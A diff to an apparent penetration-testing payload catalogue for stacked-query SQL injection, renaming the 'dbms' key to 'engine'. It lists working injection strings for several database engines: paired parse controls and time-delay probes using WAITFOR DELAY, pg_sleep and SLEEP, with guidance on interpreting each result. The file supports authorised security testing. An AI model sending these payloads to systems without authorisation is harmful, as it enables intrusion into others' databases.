@@ -17,38 +17,38 @@ safety: >
   file-write modes, requires explicit written authorisation naming that action.
 entries:
   - name: parse control -- valid second statement
-    dbms: [mysql, postgresql, mssql, sqlite]
+    engine: [mysql, postgresql, mssql, sqlite]
     payload: "'; SELECT 1--"
     detect: "Pair with the invalid control below. Interpret only the difference between the two."
 
   - name: parse control -- invalid second statement
-    dbms: [mysql, postgresql, mssql, sqlite]
+    engine: [mysql, postgresql, mssql, sqlite]
     payload: "'; SELECT FROM WHERE--"
     detect: "An error here, with none for the valid form, proves the second statement was parsed rather than discarded."
 
   - name: parse control -- valid second statement (Oracle)
-    dbms: [oracle]
+    engine: [oracle]
     payload: "'; SELECT 1 FROM dual--"
     detect: "Oracle's standard call interface does not accept stacked statements; a uniform response across both controls is the expected result."
     note: "Record the negative as a driver property. It is a result, not a skipped test."
 
   - name: parse control -- invalid second statement (Oracle)
-    dbms: [oracle]
+    engine: [oracle]
     payload: "'; SELECT FROM WHERE--"
     detect: "Paired control for the Oracle case above."
 
   - name: observable effect via delay
-    dbms: [mssql]
+    engine: [mssql]
     payload: "'; WAITFOR DELAY '0:0:{{DELAY}}'--"
     detect: "A delay of roughly {{DELAY}} seconds proves the second statement executed, not merely parsed."
 
   - name: observable effect via delay
-    dbms: [postgresql]
+    engine: [postgresql]
     payload: "'; SELECT pg_sleep({{DELAY}})--"
     detect: "A delay proves execution. PostgreSQL accepts stacked statements over most drivers."
 
   - name: observable effect via delay
-    dbms: [mysql]
+    engine: [mysql]
     payload: "'; SELECT SLEEP({{DELAY}})--"
     detect: "A delay proves execution, but most MySQL drivers reject multiple statements unless explicitly configured."
     note: "A negative here is usually the driver's configuration rather than the engine's capability. Record which."
